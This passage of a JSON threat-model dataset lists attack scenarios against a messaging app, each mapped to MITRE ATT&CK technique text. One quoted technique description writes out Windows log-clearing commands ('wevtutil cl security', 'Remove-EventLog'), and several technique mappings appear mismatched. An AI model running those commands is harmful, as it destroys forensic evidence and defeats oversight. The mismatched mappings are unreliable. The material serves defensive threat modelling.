                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a distributed denial-of-service (DDoS) attack against the application's servers.",
            "Assumptions": [
                {
                    "Assumption": "Attackers have the resources to launch a large-scale DDoS attack.",
                    "Role": "Attacker",
                    "Condition": "Access to botnets or other distributed attack tools."
                },
                {
                    "Assumption": "The application servers have limited defenses against DDoS attacks.",
                    "Role": "System Designer",
                    "Condition": "Lack of DDoS mitigation strategies and tools."
                },
                {
                    "Assumption": "No effective rate-limiting or traffic filtering mechanisms are in place.",
                    "Role": "System Administrator",
                    "Condition": "Servers are not equipped with traffic management controls."
                }
            ],
            "Potential Impact": "Disruption of service availability to legitimate users.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network attack",
                "service disruption",
                "botnet"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability to cause infinite loops, leading to resource exhaustion on the servers.",
            "Assumptions": [
                {
                    "Assumption": "There is an exploitable vulnerability causing infinite loops.",
                    "Role": "System Designer",
                    "Condition": "The application's code contains logical or programming flaws."
                },
                {
                    "Assumption": "The attacker can identify and exploit this vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of the vulnerability and capability to exploit it."
                },
                {
                    "Assumption": "The application does not have adequate input validation or error handling.",
                    "Role": "System Designer",
                    "Condition": "Lacking input validation and resilient error handling mechanisms."
                }
            ],
            "Potential Impact": "System resource exhaustion leading to unavailability of services.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "resource exhaustion",
                "vulnerability",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects companion devices, using them to flood the network with excessive traffic.",
            "Assumptions": [
                {
                    "Assumption": "Companion devices lack adequate malware protection.",
                    "Role": "System Designer",
                    "Condition": "Devices are not secured against infection."
                },
                {
                    "Assumption": "The malware can generate traffic to disrupt network services.",
                    "Role": "Attacker",
                    "Condition": "Malware capabilities include traffic generation and DoS functionalities."
                },
                {
                    "Assumption": "No network-level security mechanisms to detect and mitigate the attack.",
                    "Role": "System Administrator",
                    "Condition": "Absence of network-level intrusion detection and prevention systems."
                }
            ],
            "Potential Impact": "Network and service disruption due to excessive traffic.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "malware",
                "network traffic",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges by exploiting improper implementation of identity key management between primary and companion devices.",
            "Assumptions": [
                {
                    "Assumption": "Weaknesses in the identity key management protocol.",
                    "Role": "System Designer",
                    "Condition": "The protocol design allows for exploitation."
                },
                {
                    "Assumption": "Attackers have initial access to the network or device.",
                    "Role": "Attacker",
                    "Condition": "Partial or limited access to user devices or network."
                },
                {
                    "Assumption": "There are no additional security checks for key management.",
                    "Role": "System Administrator",
                    "Condition": "Key management operations are not adequately monitored."
                }
            ],
            "Potential Impact": "Unauthorized escalation of access privileges, leading to potential control over the application.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "key management",
                "network access",
                "credential abuse"
            ],
            "mitre_technique": {
                "name": "Network Trust Dependencies",
                "description": "Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: Pentesting AD Forests) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                "id": "attack-pattern--36aa137f-5166-41f8-b2f0-a4cfa1b4133e",
                "technique_id": "T1590.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A bug in desktop client software allows arbitrary code execution, granting high-level system privileges.",
            "Assumptions": [
                {
                    "Assumption": "The desktop client software contains a coding vulnerability.",
                    "Role": "System Designer",
                    "Condition": "The software has unpatched or known vulnerabilities."
                },
                {
                    "Assumption": "The attacker can deliver the exploit payload to the client.",
                    "Role": "Attacker",
                    "Condition": "Access to or interaction with the client software."
                },
                {
                    "Assumption": "The system does not enforce strict code execution policies.",
                    "Role": "System Designer",
                    "Condition": "Absence of execution control mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized code execution and control of the client device.",
            "MITRE ATT&CK Keywords": [
                "code execution",
                "software vulnerability",
                "privilege escalation",
                "system control"
            ],
            "mitre_technique": {
                "name": "Application Deployment Software",
                "description": "Adversaries may deploy malicious software to systems within a network using application deployment systems employed by enterprise administrators. The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.\n\nAccess to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.",
                "id": "attack-pattern--327f3cc5-eea1-42d4-a6cd-ed34b7ce8f61",
                "technique_id": "T1017"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits an OS vulnerability on the primary device to gain root access.",
            "Assumptions": [
                {
                    "Assumption": "The OS has known or zero-day vulnerabilities.",
                    "Role": "System Designer",
                    "Condition": "Unpatched or weak OS security configuration."
                },
                {
                    "Assumption": "The attacker can deploy or execute exploit code.",
                    "Role": "Attacker",
                    "Condition": "Ability to run code on the primary device."
                },
                {
                    "Assumption": "The primary device lacks advanced security measures.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate security configurations and protections on primary device."
                }
            ],
            "Potential Impact": "Root access achieved, leading to full control and data compromise.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "OS vulnerability",
                "root access",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "Compromise Software Dependencies and Development Tools",
                "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",
                "id": "attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720",
                "technique_id": "T1195.001"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "19",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could create a fake messaging application that mimics the legitimate application to steal private keys and credentials.",
            "Assumptions": [
                {
                    "Assumption": "Users might download applications from untrusted sources.",
                    "Role": "End-user",
                    "Condition": "When users do not verify the source of the application."
                },
                {
                    "Assumption": "The attacker has the capability to develop and distribute malicious software.",
                    "Role": "Attacker",
                    "Condition": "The attacker has sufficient resources and skill."
                },
                {
                    "Assumption": "The fake application has access to the same permissions as the legitimate one.",
                    "Role": "Application",
                    "Condition": "On devices where users grant permissions without scrutiny."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data (private keys, credentials).",
            "MITRE ATT&CK Keywords": [
                "application",
                "spoofing",
                "credential harvesting",
                "network",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could masquerade as a legitimate user by stealing their identity keys through phishing.",
            "Assumptions": [
                {
                    "Assumption": "Users may fall for phishing attempts and provide their credentials.",
                    "Role": "End-user",
                    "Condition": "When users are not trained in phishing detection."
                },
                {
                    "Assumption": "Phishing methods are convincing and sophisticated.",
                    "Role": "Attacker",
                    "Condition": "The attacker uses advanced social engineering techniques."
                },
                {
                    "Assumption": "The attacker can intercept the communication channel without detection.",
                    "Role": "Attacker",
                    "Condition": "The attacker has access to the communication channel."
                }
            ],
            "Potential Impact": "Impersonation of legitimate users, unauthorized access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "spoofing",
                "social engineering",
                "credential harvesting"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
                "id": "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230",
                "technique_id": "T1598.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could intercept and replace the application's update mechanism to distribute malicious updates.",
            "Assumptions": [
                {
                    "Assumption": "The attacker is on the same network as the user when an update is downloaded.",
                    "Role": "Attacker",
                    "Condition": "During the update process."
                },
                {
                    "Assumption": "The update mechanism does not validate the integrity and authenticity of updates.",
                    "Role": "Application",
                    "Condition": "If the application lacks proper validation."
                },
                {
                    "Assumption": "Users apply updates without verifying their source.",
                    "Role": "End-user",
                    "Condition": "When trust in the application is high."
                }
            ],
            "Potential Impact": "Installation of malicious software, loss of data integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "intercept",
                "spoofing",
                "network",
                "updater",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to a companion device and alters the SQLite database to inject malicious messages.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the device.",
                    "Role": "Attacker",
                    "Condition": "When devices are left unattended in insecure locations."
                },
                {
                    "Assumption": "The SQLite database is not adequately encrypted or protected.",
                    "Role": "Application",
                    "Condition": "If strong encryption is not employed."
                },
                {
                    "Assumption": "The application does not verify the integrity of the database before use.",
                    "Role": "Application",
                    "Condition": "When database integrity checks are missing."
                }
            ],
            "Potential Impact": "Corruption of data integrity, unauthorized message injection.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "physical access",
                "database",
                "message injection"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could exploit vulnerabilities in the desktop client's software to modify its code and alter data or steal messages.",
            "Assumptions": [
                {
                    "Assumption": "There are existing vulnerabilities in the desktop client's software.",
                    "Role": "Application",
                    "Condition": "If the software is not regularly updated or patched."
                },
                {
                    "Assumption": "The attacker has the tools and knowledge to exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "When the attacker is skilled and equipped."
                },
                {
                    "Assumption": "Users do not have endpoint protection or monitoring in place.",
                    "Role": "End-user",
                    "Condition": "On devices without security software."
                }
            ],
            "Potential Impact": "Modification of data, unauthorized access to message contents, data theft.",
            "MITRE ATT&CK Keywords": [
                "vulnerability",
                "tampering",
                "code alteration",
                "software exploit"
            ],
            "mitre_technique": {
                "name": "Vulnerabilities",
                "description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",
                "id": "attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327",
                "technique_id": "T1588.006"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts the encrypted messages and manipulates them before forwarding to the recipient.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can perform man-in-the-middle attacks.",
                    "Role": "Attacker",
                    "Condition": "If the network is not secure."
                },
                {
                    "Assumption": "There are weaknesses in the encryption protocol implementation.",
                    "Role": "Application",
                    "Condition": "When protocols are not correctly implemented."
                },
                {
                    "Assumption": "Users are not aware of potential tampering signs.",
                    "Role": "End-user",
                    "Condition": "When users do not verify message integrity."
                }
            ],
            "Potential Impact": "Corruption of message integrity, security and trust breach.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "tampering",
                "network",
                "message manipulation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a message or performing an action on the platform and there is no way to verify their claim due to lack of logging.",
            "Assumptions": [
                {
                    "Assumption": "The system does not have proper logging mechanisms.",
                    "Role": "Application",
                    "Condition": "When logging is not implemented or is insufficient."
                },
                {
                    "Assumption": "Users have the ability to perform actions with temporary or guest accounts.",
                    "Role": "End-user",
                    "Condition": "When account verification is weak."
                },
                {
                    "Assumption": "There is no audit trail or user activity tracking.",
                    "Role": "Application",
                    "Condition": "In the absence of a trackable audit system."
                }
            ],
            "Potential Impact": "Dispute over actions taken, lack of accountability, trust issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "audit trail",
                "user activity"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious actor exploits the system to alter logs and cover their tracks, thus denying any malicious activity.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the logging subsystem.",
                    "Role": "Attacker",
                    "Condition": "When the attacker has sufficient privileges."
                },
                {
                    "Assumption": "Log files are not adequately protected or encrypted.",
                    "Role": "Application",
                    "Condition": "If the logs are stored in plain text or weakly protected."
                },
                {
                    "Assumption": "The system lacks tamper-evident logging mechanisms.",
                    "Role": "Application",
                    "Condition": "When log integrity is not ensured."
                }
            ],
            "Potential Impact": "Altered logs, loss of forensic evidence, compromised accountability.",
            "MITRE ATT&CK Keywords": [
                "log modification",
                "repudiation",
                "tampering",
                "audit"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker uses stolen credentials to perform actions on behalf of another user, who then denies performing those actions.",
            "Assumptions": [
                {
                    "Assumption": "Credentials are compromised through phishing or other means.",
                    "Role": "Attacker",
                    "Condition": "When credential harvesting is successful."
                },
                {
                    "Assumption": "Actions performed by the attacker are logged under the victim's account.",
                    "Role": "Application",
                    "Condition": "When monitoring is insufficient to differentiate legitimate and malicious actions."
                },
                {
                    "Assumption": "Users are not alerted about unusual account activities.",
                    "Role": "Application",
                    "Condition": "In the absence of anomaly detection mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized actions, denial of legitimate activity, loss of trust in the system.",
            "MITRE ATT&CK Keywords": [
                "credential theft",
                "repudiation",
                "account misuse",
                "logging"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
